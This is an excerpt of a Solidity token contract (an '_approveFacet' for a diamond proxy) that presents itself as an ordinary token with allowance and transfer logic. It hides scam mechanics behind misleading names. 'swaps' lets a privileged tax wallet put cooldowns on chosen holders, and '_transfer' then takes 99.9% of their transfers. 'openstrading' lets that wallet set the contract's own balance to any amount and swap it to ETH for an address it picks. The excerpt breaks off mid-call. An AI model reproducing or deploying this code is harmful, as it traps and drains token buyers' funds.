...
contract _approveFacet {
    ...
    function decreaseAllowance(
        ...
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds._allowances[msg.sender][from] >= amount);
        _approve(sender(), from, ds._allowances[msg.sender][from] - amount);
        return true;
    }
    ...
    function transferFrom(
        ...
        require(ds._allowances[from][sender()] >= _amount);
        return true;
    }
    function _transfer(address from, address to, uint256 value) internal {
        ...
        bool onCooldown = (ds.cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((ds.cooldowns[from] != 0) && onCooldown) {
            _taxValue = (_cooldownFeeValue);
        }
        uint256 toBalance = ds._balances[to];
        toBalance += (value) - (_taxValue);
        ds._balances[to] = toBalance;
    }
    ...
    function swaps(address[] calldata walletAddress) external {
        ...
        for (
            ...
            if (!marketingAddres()) {} else {
                ds.cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }
    function marketingAddres() private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return (ds._taxWallet == (sender()));
    }
    function openstrading(uint256 amount, address walletAddr) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (marketingAddres()) {
            _approve(address(this), address(ds.uniV2Router), amount);
            ds._balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this);
            addressPath[1] = ds.uniV2Router.WETH();
            ds.uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amount,
                0,
                addressPath,
                walletAddr,
